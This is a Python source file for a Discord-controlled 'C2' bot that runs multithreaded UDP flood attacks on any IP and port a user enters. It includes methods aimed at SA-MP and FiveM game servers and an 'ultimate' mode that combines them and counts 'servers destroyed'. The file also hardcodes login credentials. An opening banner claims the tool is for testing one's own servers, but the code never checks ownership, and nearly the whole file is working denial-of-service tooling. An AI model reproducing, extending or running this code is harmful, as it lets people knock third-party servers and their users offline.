#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡ DEVELOPED BY LI ZANDYA - C2 NUCLEAR SYSTEM LITE ⚡
# 🔥 OPTIMIZED FOR CLOUD SHELL 🔥
# ⚠️ USE ONLY ON SERVERS YOU OWN! ⚠️

print("""
╔══════════════════════════════════════════════════════════════════╗
║                       ⚠️  WARNING ⚠️                            ║
║  This tool is for testing servers YOU OWN only!                 ║
║  Using it against others' servers is ILLEGAL!                   ║
║  You assume FULL LEGAL RESPONSIBILITY!                          ║
╚══════════════════════════════════════════════════════════════════╝
""")

import discord
from discord.ext import commands
from discord.ui import Button, View, Modal, TextInput
import asyncio
import random
import socket
import struct
import time
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ============================================
# TOKEN - Create token.txt file with your token
# ============================================
TOKEN = ""
try:
    with open("token.txt", "r") as f:
        TOKEN = f.read().strip()
        print("✅ Token loaded from token.txt")
except:
    TOKEN = input("Enter your Discord Bot Token: ").strip()

if not TOKEN:
    print("❌ No token provided!")
    exit(1)

# ============================================
# LOGIN CREDENTIALS
# ============================================
REQUIRED_IP = "187.121.21.12"
REQUIRED_USERNAME = "LI ZANDYA"
REQUIRED_PASSWORD = "C2_NUCLEAR_2024"

# ============================================
# SYSTEM SETTINGS (REDUCED FOR CLOUD SHELL)
# ============================================
CPU_CORES = os.cpu_count() or 2
MAX_THREADS = min(CPU_CORES * 100, 500)  # REDUCED for Cloud Shell
MAX_PACKET_SIZE = 4096  # REDUCED

try:
    import psutil
    TOTAL_RAM = psutil.virtual_memory().total // (1024**3)
except:
    TOTAL_RAM = 2

# ============================================
# USER AGENTS
# ============================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

# ============================================
# NUCLEAR STRESS TESTER (OPTIMIZED)
# ============================================
class NuclearTester:
    def __init__(self):
        self.running = False
        self.authenticated = False
        self.authenticated_user = None
        self.stats = {
            'total_packets': 0, 'total_bytes': 0, 'total_attacks': 0,
            'active_attacks': 0, 'start_time': None, 'servers_destroyed': 0,
            'peak_speed_pps': 0
        }
        self.threads = MAX_THREADS
        self.attack_log = []
        self.executor = ThreadPoolExecutor(max_workers=self.threads)

    def check_auth(self, ip, username, password):
        if ip == REQUIRED_IP and username.upper() == REQUIRED_USERNAME and password == REQUIRED_PASSWORD:
            self.authenticated = True
            self.authenticated_user = username
            return True
        return False

    # ============================================
    # UDP ATTACK (OPTIMIZED)
    # ============================================
    async def udp_attack(self, ip, port, duration):
        self.running = True
        if not self.stats['start_time']:
            self.stats['start_time'] = time.time()
        self.stats['active_attacks'] += 1
        sent, bytes_sent = 0, 0
        
        def udp_worker():
            nonlocal sent, bytes_sent
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                start = time.time()
                while self.running and time.time() - start < duration:
                    pkt = os.urandom(random.randint(512, 2048))
                    sock.sendto(pkt, (ip, port))
                    sent += 1
                    bytes_sent += len(pkt)
                sock.close()
            except:
                pass
        
        workers = min(self.threads, 100)
        futures = [self.executor.submit(udp_worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        
        rate = sent / duration
        if rate > self.stats['peak_speed_pps']:
            self.stats['peak_speed_pps'] = rate
        
        return sent, f"✅ UDP Complete!\n🎯 {ip}:{port}\n📦 Packets: {sent:,}\n⚡ Rate: {rate:,.0f} pps"

    # ============================================
    # SAMP ATTACK (OPTIMIZED)
    # ============================================
    async def samp_attack(self, ip, port, duration):
        self.running = True
        self.stats['active_attacks'] += 1
        sent, bytes_sent = 0, 0
        
        def samp_worker():
            nonlocal sent, bytes_sent
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                start = time.time()
                while self.running and time.time() - start < duration:
                    packet = b'SAMP' + struct.pack('<I', random.randint(1, 99999)) + b'\x80'
                    packet += struct.pack('<fffff', random.uniform(-3000,3000), random.uniform(-3000,3000), random.uniform(-3000,3000), random.uniform(0,360), random.uniform(0,360))
                    packet += struct.pack('<I', random.randint(1,46)) + struct.pack('<I', 99999) + os.urandom(500)
                    sock.sendto(packet, (ip, port))
                    sent += 1
                    bytes_sent += len(packet)
                sock.close()
            except:
                pass
        
        workers = min(self.threads, 100)
        futures = [self.executor.submit(samp_worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        
        rate = sent / duration
        return sent, f"✅ SAMP Complete!\n🎯 {ip}:{port}\n📦 Packets: {sent:,}\n⚡ Rate: {rate:,.0f} pps"

    # ============================================
    # FIVEM ATTACK (OPTIMIZED)
    # ============================================
    async def fivem_attack(self, ip, port, duration):
        self.running = True
        self.stats['active_attacks'] += 1
        sent, bytes_sent = 0, 0
        
        def fivem_worker():
            nonlocal sent, bytes_sent
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                start = time.time()
                while self.running and time.time() - start < duration:
                    packet = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00' + os.urandom(500)
                    sock.sendto(packet, (ip, port))
                    sent += 1
                    bytes_sent += len(packet)
                sock.close()
            except:
                pass
        
        workers = min(self.threads, 100)
        futures = [self.executor.submit(fivem_worker) for _ in range(workers)]
        await asyncio.sleep(duration)
        self.running = False
        
        self.stats['total_packets'] += sent
        self.stats['total_bytes'] += bytes_sent
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        
        rate = sent / duration
        return sent, f"✅ FIVEM Complete!\n🎯 {ip}:{port}\n📦 Packets: {sent:,}\n⚡ Rate: {rate:,.0f} pps"

    # ============================================
    # ULTIMATE ATTACK (ALL METHODS)
    # ============================================
    async def ultimate_attack(self, ip, port, duration):
        self.running = True
        self.stats['active_attacks'] += 1
        total_packets = 0
        
        tasks = [
            self.udp_attack(ip, port, duration),
            self.samp_attack(ip, port, duration),
            self.fivem_attack(ip, port, duration)
        ]
        
        results = await asyncio.gather(*tasks)
        for packets, _ in results:
            total_packets += packets
        
        self.stats['servers_destroyed'] += 1
        self.stats['active_attacks'] -= 1
        self.stats['total_attacks'] += 1
        
        return total_packets, f"""
╔══════════════════════════════════════════════════════════════════╗
║              💀 ULTIMATE NUCLEAR ATTACK COMPLETE 💀              ║
╠══════════════════════════════════════════════════════════════════╣
║ 🎯 Target: {ip}:{port}                                           ║
║ ⏱️ Duration: {duration}s                                         ║
║ 📦 Total Packets: {total_packets:,}                              ║
║ ⚡ Rate: {total_packets/duration:,.0f} pps                       ║
║ 💀 Servers Destroyed: {self.stats['servers_destroyed']}          ║
║ 🔥 CPU: {CPU_CORES} Cores | 🧵 Threads: {self.threads}           ║
║ 💾 RAM: {TOTAL_RAM} GB                                           ║
╚══════════════════════════════════════════════════════════════════╝"""

    async def stop(self):
        self.running = False
        return "⏹️ ALL ATTACKS STOPPED!"

tester = NuclearTester()

# ============================================
# DISCORD BOT INTERFACE
# ============================================
class LoginModal(Modal):
    def __init__(self):
        super().__init__(title="💀 LOGIN 💀")
        self.ip = TextInput(label="🌐 IP", placeholder=REQUIRED_IP, default=REQUIRED_IP)
        self.user = TextInput(label="👤 USERNAME", placeholder=REQUIRED_USERNAME, default=REQUIRED_USERNAME)
        self.pwd = TextInput(label="🔑 PASSWORD", placeholder=REQUIRED_PASSWORD, default=REQUIRED_PASSWORD)
        self.add_item(self.ip); self.add_item(self.user); self.add_item(self.pwd)
    
    async def on_submit(self, interaction: discord.Interaction):
        if tester.check_auth(self.ip.value, self.user.value, self.pwd.value):
            await interaction.response.send_message(f"✅ ACCESS GRANTED!\n👑 {self.user.value}\n💀 Type !von", ephemeral=True)
        else:
            await interaction.response.send_message("❌ ACCESS DENIED!", ephemeral=True)

class LoginView(View):
    def __init__(self):
        super().__init__(timeout=180)
    @discord.ui.button(label="🔐 LOGIN", style=discord.ButtonStyle.danger, emoji="💀")
    async def login(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(LoginModal())

class ControlPanel(View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="📡 UDP", style=discord.ButtonStyle.danger, row=0)
    async def udp_btn(self, interaction, button):
        modal = Modal(title="💀 UDP")
        ip = TextInput(label="IP", placeholder="YOUR_SERVER_IP", required=True)
        port = TextInput(label="Port", placeholder="7777", required=True)
        duration = TextInput(label="Duration", placeholder="60", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
        async def on_submit(interaction):
            await interaction.response.send_message(f"💀 UDP attack on {ip.value}:{port.value}", ephemeral=True)
            _, msg = await tester.udp_attack(ip.value, int(port.value), int(duration.value))
            await interaction.followup.send(msg, ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="🎮 SAMP", style=discord.ButtonStyle.primary, row=0)
    async def samp_btn(self, interaction, button):
        modal = Modal(title="💀 SAMP")
        ip = TextInput(label="SAMP IP", placeholder="YOUR_SAMP_IP", required=True)
        port = TextInput(label="Port", placeholder="7777", required=True)
        duration = TextInput(label="Duration", placeholder="60", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
        async def on_submit(interaction):
            await interaction.response.send_message(f"💀 SAMP attack on {ip.value}:{port.value}", ephemeral=True)
            _, msg = await tester.samp_attack(ip.value, int(port.value), int(duration.value))
            await interaction.followup.send(msg, ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="🚗 FIVEM", style=discord.ButtonStyle.success, row=0)
    async def fivem_btn(self, interaction, button):
        modal = Modal(title="💀 FIVEM")
        ip = TextInput(label="FIVEM IP", placeholder="YOUR_FIVEM_IP", required=True)
        port = TextInput(label="Port", placeholder="30120", required=True)
        duration = TextInput(label="Duration", placeholder="60", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
        async def on_submit(interaction):
            await interaction.response.send_message(f"💀 FIVEM attack on {ip.value}:{port.value}", ephemeral=True)
            _, msg = await tester.fivem_attack(ip.value, int(port.value), int(duration.value))
            await interaction.followup.send(msg, ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="💀 ULTIMATE", style=discord.ButtonStyle.danger, row=1)
    async def ultimate_btn(self, interaction, button):
        modal = Modal(title="💀 ULTIMATE")
        ip = TextInput(label="IP", placeholder="YOUR_SERVER_IP", required=True)
        port = TextInput(label="Port", placeholder="7777", required=True)
        duration = TextInput(label="Duration", placeholder="60", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
        async def on_submit(interaction):
            await interaction.response.send_message(f"💀 ULTIMATE on {ip.value}:{port.value}", ephemeral=True)
            _, msg = await tester.ultimate_attack(ip.value, int(port.value), int(duration.value))
            await interaction.followup.send(msg, ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="📊 STATS", style=discord.ButtonStyle.secondary, row=2)
    async def stats_btn(self, interaction, button):
        elapsed = time.time() - tester.stats['start_time'] if tester.stats['start_time'] else 0
        embed = discord.Embed(title="📊 STATISTICS", color=0xFFD700)
        embed.add_field(name="📦 Packets", value=f"{tester.stats['total_packets']:,}", inline=True)
        embed.add_field(name="🎯 Attacks", value=f"{tester.stats['total_attacks']}", inline=True)
        embed.add_field(name="🏆 Peak PPS", value=f"{tester.stats['peak_speed_pps']:,.0f}", inline=True)
        embed.add_field(name="💀 Destroyed", value=f"{tester.stats['servers_destroyed']}", inline=True)
        embed.add_field(name="⏱️ Uptime", value=f"{int(elapsed)}s", inline=True)
        embed.add_field(name="🧵 Threads", value=f"{tester.threads}", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="⏹️ STOP", style=discord.ButtonStyle.danger, row=2)
    async def stop_btn(self, interaction, button):
        msg = await tester.stop()
        await interaction.response.send_message(msg, ephemeral=True)

# ============================================
# BOT SETUP
# ============================================
bot = commands.Bot(command_prefix='!', intents=discord.Intents.default())

@bot.event
async def on_ready():
    print(f"✅ Bot Online: {bot.user}")
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="!von"))

@bot.command()
async def login(ctx):
    await ctx.send("🔐 **LOGIN**", view=LoginView())

@bot.command()
async def von(ctx):
    if not tester.authenticated:
        await ctx.send("❌ Type `!login` first!")
        return
    embed = discord.Embed(title="💀 NUCLEAR PANEL 💀", description=f"```CPU: {CPU_CORES} Cores\nThreads: {tester.threads}\nRAM: {TOTAL_RAM} GB\nPeak: {tester.stats['peak_speed_pps']:,.0f} pps\n👑 {tester.authenticated_user}```", color=0xFF0000)
    await ctx.send(embed=embed, view=ControlPanel())

if __name__ == "__main__":
    print("Starting C2 Nuclear System (LITE Edition)...")
    bot.run(TOKEN)
